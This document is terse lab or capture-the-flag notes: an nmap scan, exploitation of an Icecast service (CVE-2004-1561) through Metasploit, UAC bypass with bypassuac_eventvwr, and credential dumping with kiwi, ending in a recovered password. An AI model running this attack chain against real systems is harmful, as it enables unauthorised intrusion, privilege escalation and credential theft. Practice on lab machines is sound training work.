+ Performed standard nmap scan 
	`sudo nmap -sC -sV -p- 10.10.224.113`
+ Service called IceCast running on port 8000
+ Searching cvedetails.com, found CVE-2004-1561
+ Ran metasploit exploit to gain foothold as USER
+ In meterpreter, ran following command to test possible exploits:
	`run post/multi/recon/local_exploit_suggester`
+ Using the first suggested exploit:
	`use exploit/windows/local/bypassuac_eventvwr`
+ Set LHOST to tun IP
+ Set SESSION to 1 
+ run to gain escalated privileges, confirm using `getuid`
+ load kiwi, steal creds to get Dark:Password01!

